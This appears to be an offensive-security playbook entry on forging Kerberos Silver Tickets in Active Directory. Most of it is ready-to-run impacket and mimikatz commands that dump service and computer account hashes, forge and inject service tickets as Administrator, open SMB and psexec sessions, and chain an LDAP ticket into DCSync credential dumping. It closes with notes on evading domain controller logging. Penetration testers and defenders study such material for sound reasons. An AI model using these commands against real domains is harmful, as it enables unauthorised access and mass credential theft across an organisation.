---
id: silver-ticket
title: Silver Ticket
stage: objective
tags: [windows, ad, kerberos]
tools:
  - impacket-ticketer -spn cifs/$TARGET -domain-sid $SID -nthash $SERVICE_HASH -domain domain.local Administrator
  - mimikatz "kerberos::golden /domain: /sid: /target: /service:cifs /rc4: /user:Administrator /ptt"
leads_to: [system-shell, pivot]
summary: Forge a service ticket (TGS) using a service account's NTLM hash to access a specific service as any user — no DC contact required.
---

## What is a Silver Ticket

A Silver Ticket is a forged Kerberos TGS (service ticket) signed with the NTLM hash of a service account or computer account. Unlike a Golden Ticket, it doesn't require the KRBTGT hash and bypasses the KDC entirely — communication goes directly from attacker to the target service. It grants access to **one specific service** on **one specific machine**.

## Gather What You Need

```bash
# 1. Domain SID
impacket-getPac -targetUser Administrator domain.local/user:pass -dc-ip $DC
# or from BloodHound / impacket-lookupsid

# 2. Service account NTLM hash (from DCSync, secretsdump, SAM dump, etc.)
# Target the computer account hash for cifs/http/host tickets

# 3. SPN of the target service
# cifs/$TARGET      = SMB file access
# http/$TARGET      = IIS/web
# host/$TARGET      = generic host management (includes services, schtasks)
# mssqlsvc/$TARGET  = SQL Server
```

## Forge with Impacket

```bash
# Get domain SID first
impacket-getPac domain.local/user:password -targetUser Administrator -dc-ip $DC

# Forge ticket
impacket-ticketer \
  -spn cifs/$TARGET.domain.local \
  -domain-sid S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  -nthash SERVICE_NTLM_HASH \
  -domain domain.local \
  Administrator

# Use the ticket
export KRB5CCNAME=Administrator.ccache
impacket-smbclient -k -no-pass domain.local/Administrator@$TARGET
impacket-psexec -k -no-pass domain.local/Administrator@$TARGET
```

## Forge with Mimikatz

```powershell
# From a compromised Windows host
mimikatz.exe

# Dump service account hash first (if not already obtained)
lsadump::dcsync /domain:domain.local /user:TARGET_COMPUTER$

# Forge and inject the ticket
kerberos::golden \
  /domain:domain.local \
  /sid:S-1-5-21-XXXXXXXXXX-XXXXXXXXXX-XXXXXXXXXX \
  /target:$TARGET.domain.local \
  /service:cifs \
  /rc4:SERVICE_NTLM_HASH \
  /user:Administrator \
  /ptt

# Verify
klist
dir \\$TARGET\C$
```

## Common Silver Ticket SPNs

| SPN | Access Gained |
|-----|--------------|
| `cifs/$TARGET` | SMB file shares (C$, ADMIN$) |
| `host/$TARGET` | Services, schtasks, WMI |
| `http/$TARGET` | IIS web apps |
| `mssqlsvc/$TARGET` | SQL Server |
| `ldap/$DC` | LDAP queries / DCSync |
| `krbtgt/$DOMAIN` | (Golden Ticket territory) |

## LDAP Silver Ticket → DCSync

```bash
# Forge LDAP ticket using DC's NTLM hash → enables DCSync without being DA
impacket-ticketer \
  -spn ldap/$DC.domain.local \
  -domain-sid $SID \
  -nthash DC_COMPUTER_NTLM_HASH \
  -domain domain.local \
  Administrator

export KRB5CCNAME=Administrator.ccache
impacket-secretsdump -k -no-pass domain.local/Administrator@$DC
```

## Notes

- Silver tickets are **not logged at the DC** (no TGS-REQ) — only the target service sees the request
- The forged ticket uses RC4 (NTLM hash) by default; AES keys require the AES hash from the DC
- Computer account hashes change every 30 days by default — use the current hash
- PAC validation can detect forgery if the service validates with the DC; many services don't

